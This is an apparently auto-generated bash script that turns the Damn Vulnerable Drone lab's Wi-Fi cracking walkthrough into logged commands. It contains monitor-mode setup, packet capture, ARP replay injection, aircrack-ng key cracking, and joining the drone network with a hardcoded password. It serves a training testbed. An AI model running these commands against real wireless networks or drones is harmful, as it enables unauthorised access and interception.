#!/usr/bin/env bash
set -euo pipefail
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ printf '[%(%F_%T)T] %s
' -1 "$*"; }
fi

# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Wifi-Analysis-&-Cracking.md
# Created: 2025-09-10 04:31:52
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=wifi-analysis-_-cracking src=Wifi-Analysis-&-Cracking.md"
log "[BLOCK 1] type=shell"
sudo airodump-ng wlan0mon

log "[BLOCK 2] type=shell"
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

log "[BLOCK 3] type=shell"
sudo airmon-ng start wlan0

log "[BLOCK 4] type=shell"
sudo airodump-ng -c 6 --bssid 02:00:00:00:01:00 -w capture wlan0mon

log "[BLOCK 5] type=shell"
sudo aireplay-ng --arpreplay -b 02:00:00:00:01:00 -h 02:00:00:00:02:00 wlan0mon

log "[BLOCK 6] type=shell"
sudo aircrack-ng capture-01.cap

log "[BLOCK 7] type=shell"
nmcli dev wifi connect "Drone_Wifi" password "1234567890"

log "[BLOCK 8] type=shell"
ifconfig wlan3

